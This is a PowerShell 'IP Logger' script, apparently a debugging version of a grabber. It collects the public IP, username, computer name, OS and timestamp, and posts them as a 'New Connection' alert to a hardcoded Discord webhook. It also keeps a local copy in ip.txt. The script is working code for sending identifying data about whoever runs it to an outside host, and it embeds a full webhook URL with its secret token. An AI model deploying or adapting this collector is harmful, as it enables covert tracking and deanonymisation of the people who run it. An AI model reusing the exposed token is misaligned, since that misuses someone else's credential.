# VERBOSE VERSION - Shows everything that's happening

Write-Host "================================" -ForegroundColor Cyan
Write-Host "Starting IP Logger Script" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan

# Get public IP
Write-Host "`n[1/5] Fetching public IP..." -ForegroundColor Yellow
try {
    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org")
    Write-Host "      IP: $ip" -ForegroundColor Green
} catch {
    $ip = "Unable to fetch"
    Write-Host "      Failed to get IP: $($_.Exception.Message)" -ForegroundColor Red
}

# Get username
Write-Host "`n[2/5] Getting username..." -ForegroundColor Yellow
$user = $env:USERNAME
Write-Host "      User: $user" -ForegroundColor Green

# Get machine info
Write-Host "`n[3/5] Getting OS info..." -ForegroundColor Yellow
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$computer = $env:COMPUTERNAME
Write-Host "      Computer: $computer" -ForegroundColor Green
Write-Host "      OS: $os" -ForegroundColor Green

# Get time
Write-Host "`n[4/5] Getting timestamp..." -ForegroundColor Yellow
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Host "      Time: $time" -ForegroundColor Green

# Compose message
$message = "**New Connection**`n:clock1: $time`n:computer: $computer`n:bust_in_silhouette: $user`n:desktop: $os`n:globe_with_meridians: $ip"

# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"

Write-Host "`n[5/5] Sending to Discord..." -ForegroundColor Yellow
Write-Host "      Webhook: $($webhookUrl.Substring(0,50))..." -ForegroundColor Gray

# Create JSON payload
$payload = @{
    content = $message
} | ConvertTo-Json

Write-Host "      Payload created" -ForegroundColor Gray
Write-Host "      Sending HTTP POST..." -ForegroundColor Gray

# Send to Discord
try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -Verbose
    Write-Host "`n================================" -ForegroundColor Green
    Write-Host "SUCCESS! Message sent to Discord!" -ForegroundColor Green
    Write-Host "================================" -ForegroundColor Green
} catch {
    Write-Host "`n================================" -ForegroundColor Red
    Write-Host "FAILED TO SEND!" -ForegroundColor Red
    Write-Host "================================" -ForegroundColor Red
    Write-Host "Error Message: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Error Type: $($_.Exception.GetType().FullName)" -ForegroundColor Red
    
    if ($_.Exception.Response) {
        Write-Host "Status Code: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
        Write-Host "Status Description: $($_.Exception.Response.StatusDescription)" -ForegroundColor Red
    }
    
    Write-Host "`nFull Error Details:" -ForegroundColor Red
    Write-Host $_ -ForegroundColor Red
}

# Save backup locally
Write-Host "`nSaving backup locally..." -ForegroundColor Yellow
$doc = [Environment]::GetFolderPath("MyDocuments")
$out = Join-Path $doc "ip.txt"
Add-Content -Path $out -Value "$time | $user | $computer | $os | IP: $ip"
Write-Host "Backup saved to: $out" -ForegroundColor Green

Write-Host "`n================================" -ForegroundColor Cyan
Read-Host "Press Enter to close"
